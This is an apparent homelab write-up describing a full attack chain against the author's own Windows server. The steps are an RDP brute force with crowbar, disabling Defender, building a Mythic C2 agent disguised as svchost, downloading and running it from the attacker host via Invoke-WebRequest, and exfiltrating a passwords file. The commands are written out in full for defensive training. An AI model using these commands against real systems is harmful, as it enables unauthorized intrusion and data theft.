
### 1. Introduction

Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 agent and host it, establish a C2 session from a compromised Windows server and exfiltrate a sensitive file to complete the attack chain.

---

### 2. Objective

- Launch a brute force attack on a Windows server.
- Run discovery and defense evasion commands.
- Build and host a Mythic payload.
- Download and execute the payload on the Windows target.
- Establish a C2 session and exfiltrate the `passwords.txt` file.

---

### 3. Preparing the Windows Server

1. **Create Fake Password File**
    - Navigate to `Documents` and create a file named `passwords.txt`.
        <img width="825" height="263" alt="image" src="https://github.com/user-attachments/assets/6eea9ee7-8e65-4ae4-bfee-acac31891189" />


2. **Change Windows Password**
    
    - Go to:  
        `Start Menu` → Username → `Change Account Settings` → `Sign-in Options` → Password → `Change`
        
    - Set the new password to `Winter2024!`.
        
3. **Adjust Password Policy (if required)**
    
    - Minimum password length: **5 characters**
    - Disable complexity requirements in _Local Group Policy Editor_.
    <img width="842" height="399" alt="image" src="https://github.com/user-attachments/assets/0573be57-d6dc-422e-9f62-707531e75461" />


---

### 4. Performing RDP Brute Force Attack

1. **Prepare Wordlist**
    - Navigate to Kali Linux terminal:
        
        `cd /usr/share/wordlists 
        `sudo gunzip rockyou.txt.gz 
        `sudo head -50 rockyou.txt > ~/home/kali/mydfir-wordlist.txt 
        `echo "Winter2024!" >> ~/home/kali/mydfir-wordlist.txt
        <img width="1129" height="778" alt="image" src="https://github.com/user-attachments/assets/1946cd67-7bc5-4a49-bd96-975b9cfc6384" />

        
2. **Install Crowbar**
    
    `sudo apt-get update && sudo apt-get upgrade -y 
    `sudo apt-get install -y crowbar`
    
3. **Create Target File**
    
    - Add Windows Server IP and username.
        
4. **Run Brute Force Attack**
    
    `crowbar -b rdp -u Administrator -C Challenge-Wordlist.txt -s <MYDFIR-WIN-emaan-IP>/32`
    
5. **Successful Login**
    
    - Username: `Administrator`
    - Password: `Winter2024!`
        
<img width="799" height="277" alt="image" src="https://github.com/user-attachments/assets/4c6f45d0-63e0-4faf-9537-3ffca5551ed5" />


---

### 5. Connecting to the Windows Server

1. **Establish RDP Session**
    
    `xfreerdp /u:Administrator /p:Winter2024! /v:<MYDFIR-WIN-IP>:3389`
    
2. **Trust the certificate** to complete the connection.
    
<img width="875" height="623" alt="image" src="https://github.com/user-attachments/assets/c488e7a3-e53a-4564-8dab-d9e61b4f922c" />

---

### 6. Discovery Phase

Run basic discovery commands in PowerShell or CMD:

`whoami 
`ipconfig 
`net user 
`net group 
`net user Administrator`
<img width="788" height="161" alt="image" src="https://github.com/user-attachments/assets/11ad2021-fc9c-4583-99f7-bbebeebeda4d" />

<img width="406" height="324" alt="image" src="https://github.com/user-attachments/assets/f67e4574-a286-4852-bf8a-e4189cad78b8" />

---

### 7. Defense Evasion

Disable Windows Defender:

- Open **Windows Security** → **Virus & Threat Protection**.
- Disable Real-time protection and other security features.
<img width="782" height="670" alt="image" src="https://github.com/user-attachments/assets/203b2f37-5a6d-49f4-ba7c-98faa4057ab5" />

---

### 8. Execution Phase (Mythic Agent Setup)

1. **Access Mythic Server**
    
    `ssh root@<MYDFIR-MYTHIC-IP>`
    
2. **Install Apollo Agent**
    
    `./mythic-cli install github https://github.com/MythicAgents/Apollo.git`
    
    <img width="489" height="135" alt="image" src="https://github.com/user-attachments/assets/559101b1-dd5b-4a9a-b06e-7d1a76430743" />

    
3. **Install HTTP C2 Profile**
    
    `./mythic-cli install github https://github.com/MythicC2Profiles/http`
    
    <img width="684" height="277" alt="image" src="https://github.com/user-attachments/assets/e9ff0379-9edc-4658-8ad7-a464a150e306" />

    
4. **Create Payload in Mythic Web GUI**
    
    - Target OS: **Windows**
    - Output Format: **WinExe**
    - Commands: **Include All**
    - C2 Profile: **HTTP**
    - Callback Host: `http://<MYDFIR-MYTHIC-IP>`
    - Port: `80`
    - Payload Name: `apollo.exe`

<img width="1100" height="469" alt="image" src="https://github.com/user-attachments/assets/48498763-0a9f-41df-af08-c59c8bbfb80a" />


---

### 9. Hosting and Downloading Payload

1. **Download Payload, Rename file to "svchost-emaan.exe", move the file to a new directory**
    
    `wget <payload_download_link> --no-check-certificate
    `mv lcd5d49e-680e-4478-8526-708858e25b14 svchost-emaan.exe`
    
    <img width="498" height="49" alt="image" src="https://github.com/user-attachments/assets/921edabb-ce53-4c88-87f3-907a48cb23ed" />

    
2. **Serve Payload over HTTP**
    
    `ufw allow 80 
    `ufw allow 9999`
    `python3 -m http.server 9999`

<img width="575" height="98" alt="image" src="https://github.com/user-attachments/assets/2c3b91be-f0a4-4417-a45a-376233cd8da5" />
<img width="325" height="217" alt="image" src="https://github.com/user-attachments/assets/f8b3393e-2bd2-4f15-afe4-3c8a7d116400" />

![[Pasted image 20251018171120.png]]
3. **Download on Windows Target**
    
    `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/svchost-emaan.exe -OutFile "C:\Users\Public\Downloads\svchost-emaan.exe"`
    
    - Navigate into "C:\Users\Public\Downloads" to check if the file has been downloaded.
    
    <img width="200" height="53" alt="image" src="https://github.com/user-attachments/assets/a7300b5a-a187-4e77-a277-5868b6e6aa66" />


    
3. **Execute Payload**
    
    `.\svchost-emaan.exe`
    
4. **Verify Connection**
    
    `netstat -anob`
    
    - Also check Task Manager or Mythic GUI callbacks.
    
---

### 10. Establishing C2 Connection

- Open Mythic Web GUI → **Active Callbacks**.
- Interact with the agent and run:
    
    `whoami 
    `ipconfig`
    
    <img width="1001" height="113" alt="image" src="https://github.com/user-attachments/assets/af3c2587-4544-4f9f-9de6-fcb722d0d5d9" />


<img width="616" height="174" alt="image" src="https://github.com/user-attachments/assets/8c1e1df4-705f-40cf-b4a2-59a4868665b5" />



---

### 11. Exfiltration

1. **Download the Target File**
    
    `download C:\Users\Administrator\Documents\passwords.txt`

    
2. **Verify in Mythic Web GUI**
    - Navigate to **Files** → Check `passwords.txt` contents.


![Uploading image.png…]()


**Reference**
https://youtu.be/85x0NLj2zUo?si=_cpuOgH-OqAYwgYo
